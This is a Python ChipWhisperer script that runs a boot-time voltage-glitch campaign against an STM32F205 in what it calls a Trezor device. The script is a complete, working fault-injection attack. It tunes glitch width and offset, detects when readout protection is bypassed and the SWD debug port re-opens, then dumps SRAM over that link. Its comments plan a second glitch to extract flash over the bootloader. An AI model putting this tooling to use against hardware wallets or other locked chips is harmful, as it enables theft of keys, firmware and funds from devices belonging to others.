#!/usr/bin/env python3
"""
Glitch-1 campaign: boot-time RDP-corrupt glitch + optional power-trace capture.

Built on the PROVEN scope/glitch config from 1-trezor_fun.py so it matches the
existing wiring (trigger = tio4 = reset line, glitch out on lp+hp crowbar).

SUCCESS CRITERION (fixed 2026-10-11): SWD enumerates => the boot glitch
landed. A corrupted option-byte RDP read defaults the chip to RDP1 behaviour
and re-opens the debug port (SecGlitcher) -- same criterion as 1-trezor_fun.
The old canary demanded a plain SWD flash read of 0x08000000 with valid
vectors, i.e. RDP0-for-the-whole-cycle, which a boot glitch cannot produce
(Kraken: RDP1->RDP0 "infeasible in practice, due to the hamming distance";
0xFF->0xAA = 4 specific bit flips). Its "AP fault at 0x08000000" fails were
actually glitch-1 successes: SWD connected, flash refused = textbook RDP1.
The flash read stays in as INFORMATION: AP fault = RDP1 as expected; flash
extraction itself is glitch 2 over the UART bootloader (docs/RECOVERY_PLAN.md).

Per attempt it:
  1. power-cycles the target and fires the glitch at reset + ext_offset
  2. captures the ChipWhisperer power trace (saved to TRACES/, G_CAP_TRACES=1)
  3. checks SWD enumeration => glitch-1 success; reads 0x08000000 over SWD
     for information (AP fault = RDP1 expected; valid vectors = RDP0-like?!)
  4. on SUCCESS: dumps SRAM over the same live SWD connection (G_VALIDATE=1)
     -- clean full dump + all-zero content => SWD link proven end-to-end

Nothing here is destructive: SWD reads + normal resets only. No option-byte
writes, no RDP regression (which would mass-erase).

WIRING NOTE: TIO1 -> lifted BOOT0 pin. This script sets TIO1 LOW (defined
normal/firmware boot) before any power-cycle; set True for bootloader boots.
"""

import os
import sys
import time
import signal
import atexit
import numpy as np
import chipwhisperer as cw
import chipwhisperer.common.results.glitch as glitch
from datetime import datetime

# ---- ChipWhisperer protection knobs -----------------------------------------
# Crowbar best-practice: minimise glitch ENERGY and never leave the MOSFETs
# conducting. Keep repeat small, cool down between shots, rest periodically.
COOLDOWN_S   = float(os.environ.get("G_COOLDOWN", 0.15))  # between every shot
REST_EVERY   = int(os.environ.get("G_REST_EVERY", 150))   # shots
REST_S       = float(os.environ.get("G_REST_S", 20))      # thermal rest
# scope MEASURE is not wired -> trace capture OFF by default (flat channel).
# set G_CAP_TRACES=1 only after you've wired a shunt to the analog input.
CAP_TRACES   = os.environ.get("G_CAP_TRACES", "0") == "1"
# SRAM validation dump right after a successful glitch (G_VALIDATE=0 to skip).
VALIDATE     = os.environ.get("G_VALIDATE", "1") == "1"
VAL_BYTES    = int(os.environ.get("G_SRAM_BYTES", "0x20000"), 0)  # 128 KB

# ---- canary -----------------------------------------------------------------
# Glitch-1 success = SWD enumerates (RDP1 behaviour, debug port open).
# The 0x08000000 flash read is INFORMATION ONLY -- valid vectors (RDP0-like)
# would be a surprise (Kraken: infeasible), not the pass condition.
CANARY_ADDR = 0x08000000      # firmware vector table: [0]=initial SP, [1]=reset vec
CANARY_LEN  = 16

def looks_like_valid_vectors(data: bytes) -> bool:
    """A real read of 0x08000000 starts with a plausible SP and reset vector."""
    if not data or len(data) < 8:
        return False
    if data == b"\x00" * len(data) or data == b"\xFF" * len(data):
        return False
    sp  = int.from_bytes(data[0:4], "little")
    rst = int.from_bytes(data[4:8], "little")
    # STM32F205: SRAM 0x2000_0000..0x2002_0000 ; flash 0x0800_0000..0x0810_0000
    sp_ok  = 0x20000000 <= sp  <= 0x20020000
    rst_ok = 0x08000000 <= rst <= 0x08100000
    return sp_ok and rst_ok

_swd_dev = None   # live SWD handle from the successful canary attempt

def canary_read():
    """Glitch-1 check: SWD enumerates => the boot glitch landed (RDP1).

    The vector-table flash read is informational: AP fault = RDP1 behaving
    exactly as expected (flash locked); valid vectors = RDP0-like behaviour
    (a surprise -- log it loudly). Returns (ok, data_or_None, note).
    """
    global _swd_dev
    try:
        import swd
        os.system("/home/tdaly/.cwvenv/usb_reset > /dev/null 2>&1")
        time.sleep(0.3)
        dev = swd.Swd()
        _swd_dev = dev
    except Exception as e:
        return False, None, f"no SWD ({type(e).__name__}: {str(e)[:30]})"

    # SWD enumerated => the boot glitch landed: RDP1 behaviour, debug port open.
    try:
        data = bytes(dev.read_mem(CANARY_ADDR, CANARY_LEN))
    except Exception as e:
        return True, None, f"SWD live, flash refused ({type(e).__name__}) => RDP1"
    if looks_like_valid_vectors(data):
        return True, data, "valid flash vectors -- RDP0-like?!"
    return True, data, "SWD live; flash read not valid (zeros/ff)"

def sram_validate():
    """Prove the SWD link end-to-end: dump SRAM over the same live connection.

    Expected on this target: zero read errors, content all-zero (bootloader/
    early-boot state; 1.13.1 keeps recovery keys out of RAM anyway). A read
    error mid-dump means a LINK problem, not memory content.
    """
    dev = _swd_dev
    if dev is None:
        print("  (validation skipped: no live SWD handle)")
        return
    base  = 0x20000000
    outdir = f"SRAM_{time.strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(outdir, exist_ok=True)
    path = os.path.join(outdir, "sram_0x20000000.bin")
    dump = bytearray()
    addr = base
    errors = 0
    while addr < base + VAL_BYTES:
        try:
            dump += bytes(dev.read_mem(addr, 256))
            addr += 256
        except Exception as e:
            errors += 1
            print(f"  x SWD read error at 0x{addr:08X}: {str(e)[:40]}")
            break
    with open(path, "wb") as f:
        f.write(dump)
    nz = sum(1 for b in dump if b not in (0, 0xFF))
    print(f"  SRAM validation: {len(dump)}/{VAL_BYTES} bytes -> {path}")
    print(f"    read errors: {errors} | non-trivial bytes: {nz}/{len(dump)}")
    if errors == 0 and len(dump) == VAL_BYTES:
        verdict = "all-zero as expected" if nz == 0 else "non-zero content (unexpected)"
        print(f"  SWD link validated end-to-end (clean full dump, {verdict})")
    else:
        print("  SWD link NOT healthy: dump incomplete -- check ST-Link wiring/seating")

# ---- scope / glitch setup (mirrors 1-trezor_fun.py) --------------------------
print("=" * 60)
print("Glitch-1 campaign: boot glitch (SWD-enumerates = success)")
print("=" * 60)

scope = cw.scope()
scope.io.target_pwr = "high_z"

scope.clock.clkgen_freq = 100e6
# ADC sampling clock must be derived from clkgen and LOCKED, or capture() divides
# by zero. Only bother if we're actually capturing traces (scope wired).
TRACE_OK = False
if CAP_TRACES:
    scope.clock.adc_src = "clkgen_x1"
    for _ in range(6):
        try:
            scope.clock.reset_adc()
        except Exception:
            pass
        time.sleep(0.5)
        if scope.clock.adc_locked:
            TRACE_OK = True
            break
    print(f"  ADC clock locked: {TRACE_OK} (adc_freq={scope.clock.adc_freq})")
    if not TRACE_OK:
        print("  ⚠ ADC not locked -> running glitch+canary WITHOUT traces")
else:
    print("  trace capture OFF (scope MEASURE not wired) -> glitch+canary only")

scope.trigger.triggers  = "tio4"          # reset line
scope.adc.samples       = 24400
scope.adc.offset        = 0
scope.adc.basic_mode    = "rising_edge"
scope.adc.decimate      = 10
scope.glitch.clk_src    = "clkgen"
scope.glitch.output     = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 20
# TIO1 drives the lifted BOOT0 pin (see docs/WIRING_SETUP.md). Define it or
# every power-cycle samples an undefined BOOT0 -> random boot mode. LOW =
# normal (firmware) boot; HIGH = system bootloader on the next reset.
scope.io.tio1 = False

def reboot_flush():
    """Power-cycle target, arm scope, release reset (rising edge triggers)."""
    scope.io.target_pwr = False
    scope.io.nrst = False
    scope.arm()
    scope.io.nrst = "high_z"
    scope.io.target_pwr = True

# ---- CW protection: never leave the crowbar conducting ----------------------
_torn = False
def safe_teardown(*_):
    """Crowbar OFF, target unpowered, scope released. Idempotent."""
    global _torn
    if _torn:
        return
    _torn = True
    for attr, val in (("glitch_hp", False), ("glitch_lp", False),
                      ("target_pwr", False), ("nrst", "high_z")):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass

def _sig(*_):
    print("\n⚠ interrupt -> safe teardown (crowbar off, target unpowered)")
    safe_teardown()
    sys.exit(0)

atexit.register(safe_teardown)
signal.signal(signal.SIGINT, _sig)
signal.signal(signal.SIGTERM, _sig)

# ---- scan plan: known-good window 170-189us ---------------------------------
# 1-trezor_fun.py flips SWD on at ext_offset 17000, first try (2026-10-11);
# this chip never needs below 17000. env-overridable for a smoke test.
WIDTH   = int(os.environ.get("G_WIDTH",   40))
OFFSET  = int(os.environ.get("G_OFFSET",  -45))
EXT_MIN = int(os.environ.get("G_EXT_MIN", 17000))
EXT_MAX = int(os.environ.get("G_EXT_MAX", 18900))
STEP    = int(os.environ.get("G_STEP",    25))
SAMPLES = int(os.environ.get("G_SAMPLES", 8))   # attempts per ext_offset

gc = glitch.GlitchController(groups=["success", "failure"],
                             parameters=["width", "offset", "ext_offset"])
gc.set_global_step(STEP)
gc.set_range("width",  WIDTH,  WIDTH)
gc.set_range("offset", OFFSET, OFFSET)
gc.set_range("ext_offset", EXT_MIN, EXT_MAX)

os.makedirs("TRACES", exist_ok=True)
log_path = f"TRACES/recon_{datetime.now():%Y%m%d_%H%M%S}.csv"
with open(log_path, "w") as f:
    f.write("ext_offset,timing_us,sample,result,note,sp,reset_vec\n")

print(f"  width={WIDTH} offset={OFFSET} repeat={scope.glitch.repeat}")
print(f"  ext_offset {EXT_MIN}-{EXT_MAX} ({EXT_MIN/100:.0f}-{EXT_MAX/100:.0f}us) step {STEP}")
print(f"  {SAMPLES} samples/pt  |  canary=0x{CANARY_ADDR:08X}")
print(f"  log -> {log_path}")
print("=" * 60)

success_params = []
shot = 0
reboot_flush()

for gs in gc.glitch_values():
    scope.glitch.width      = gs[0]
    scope.glitch.offset     = gs[1]
    scope.glitch.ext_offset = gs[2]
    eo = scope.glitch.ext_offset

    for s in range(SAMPLES):
        reboot_flush()
        timed_out = False
        trace = None
        if TRACE_OK:
            try:
                timed_out = scope.capture()      # True == trigger timeout
                if not timed_out:
                    trace = scope.get_last_trace()
            except Exception as e:
                print(f"    (capture skipped: {type(e).__name__})", flush=True)
        time.sleep(1.5)                      # let target boot

        # reset glitch transistors (per CW docs / their working script)
        scope.io.glitch_hp = False; scope.io.glitch_hp = True
        scope.io.glitch_lp = False; scope.io.glitch_lp = True

        ok, data, note = canary_read()
        sp = rst = ""
        if data and len(data) >= 8:
            sp  = f"0x{int.from_bytes(data[0:4],'little'):08X}"
            rst = f"0x{int.from_bytes(data[4:8],'little'):08X}"

        tag = "SUCCESS" if ok else ("TRIG_TIMEOUT" if timed_out else "fail")
        if trace is not None and (ok or s == 0):
            np.save(f"TRACES/trace_eo{eo}_s{s}_{tag}.npy", trace)

        with open(log_path, "a") as f:
            f.write(f"{eo},{eo/100:.1f},{s},{tag},{note},{sp},{rst}\n")

        # crowbar thermal management
        shot += 1
        time.sleep(COOLDOWN_S)
        if shot % REST_EVERY == 0:
            print(f"    …crowbar cool-down {REST_S:.0f}s after {shot} shots")
            try:
                scope.io.target_pwr = False
            except Exception:
                pass
            time.sleep(REST_S)

        if ok:
            print(f"\n  💥 SUCCESS  ext_offset={eo} ({eo/100:.1f}us)  SP={sp} RST={rst}")
            success_params.append((eo, data))
            if VALIDATE:
                sram_validate()   # prove the SWD link, same live connection
            break   # move on; we found a working timing for this point
        else:
            print(f"    eo={eo/100:6.1f}us s{s} {tag:12s} {note}", flush=True)

    if success_params:
        print("\n✅ Boot glitch landed: SWD re-enabled (RDP1 behaviour).")
        print("   Flash extraction = glitch 2 over the UART bootloader (plan §2/§4).")
        break

print("\n" + "=" * 60)
if success_params:
    for eo, data in success_params:
        if data:
            print(f"  WORKING ext_offset={eo} ({eo/100:.1f}us)  flash first16={data.hex()} (RDP0-like?!)")
        else:
            print(f"  WORKING ext_offset={eo} ({eo/100:.1f}us)  SWD live, flash refused = RDP1 (expected)")
else:
    print("  No SWD re-enable in this window. Widen EXT_MIN/EXT_MAX or sweep")
    print("  WIDTH (e.g. 30-50) and inspect TRACES/*.npy to relocate the check.")
print(f"  trace + log dir: TRACES/   csv: {log_path}")
print("=" * 60)
